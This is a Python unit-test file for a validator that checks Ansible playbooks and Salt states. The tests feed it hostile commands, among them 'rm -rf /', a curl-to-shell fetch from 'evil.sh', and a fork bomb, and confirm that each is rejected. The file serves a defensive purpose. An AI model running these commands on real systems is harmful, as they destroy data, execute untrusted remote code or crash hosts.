"""Unit tests for the artifact validation pipeline (#713)."""

from __future__ import annotations

from fleet_platform.services.artifact_validation import (
    MAX_BYTES,
    validate_ansible_playbook,
    validate_artifact,
    validate_salt_state,
)


def test_valid_playbook():
    res = validate_ansible_playbook("- hosts: all\n  tasks:\n    - ansible.builtin.ping:\n")
    assert res.valid is True
    assert res.errors == []


def test_invalid_yaml_rejected():
    res = validate_ansible_playbook("- hosts: [unclosed\n")
    assert res.valid is False
    assert any("invalid YAML" in e for e in res.errors)


def test_playbook_must_be_list():
    res = validate_ansible_playbook("hosts: all\n")
    assert res.valid is False
    assert any("list of plays" in e for e in res.errors)


def test_forbidden_ansible_raw_module():
    res = validate_ansible_playbook("- hosts: all\n  tasks:\n    - raw: rm something\n")
    assert res.valid is False
    assert any("forbidden module" in e and "raw" in e for e in res.errors)


def test_dangerous_rm_rf_root_rejected():
    pb = "- hosts: all\n  tasks:\n    - ansible.builtin.shell: rm -rf /\n"
    res = validate_ansible_playbook(pb)
    assert res.valid is False
    assert any("recursive root/home delete" in e for e in res.errors)


def test_dangerous_curl_pipe_sh_rejected():
    pb = "- hosts: all\n  tasks:\n    - ansible.builtin.shell: curl http://evil.sh | sh\n"
    res = validate_ansible_playbook(pb)
    assert res.valid is False
    assert any("pipe-to-shell" in e for e in res.errors)


def test_tls_bypass_rejected():
    pb = "- hosts: all\n  tasks:\n    - get_url:\n        url: https://x\n        validate_certs: no\n"
    res = validate_ansible_playbook(pb)
    assert res.valid is False
    assert any("TLS verification bypass" in e for e in res.errors)


def test_oversize_rejected():
    res = validate_ansible_playbook("- hosts: all # " + "x" * (MAX_BYTES + 10))
    assert res.valid is False
    assert any("cap" in e for e in res.errors)


def test_valid_salt_state():
    sls = "install_nginx:\n  pkg.installed:\n    - name: nginx\n"
    res = validate_salt_state(sls)
    assert res.valid is True


def test_salt_state_must_be_mapping():
    res = validate_salt_state("- just\n- a\n- list\n")
    assert res.valid is False
    assert any("mapping" in e for e in res.errors)


def test_forbidden_salt_cmd_run():
    sls = "do_it:\n  cmd.run:\n    - name: echo hi\n"
    res = validate_salt_state(sls)
    assert res.valid is False
    assert any("forbidden function" in e and "cmd.run" in e for e in res.errors)


def test_forkbomb_rejected():
    sls = "fb:\n  pkg.installed:\n    - name: |\n        :(){ :|:& };:\n"
    res = validate_salt_state(sls)
    assert res.valid is False
    assert any("fork bomb" in e for e in res.errors)


def test_unknown_kind():
    res = validate_artifact("x: 1", "terraform")
    assert res.valid is False
    assert any("unknown artifact kind" in e for e in res.errors)
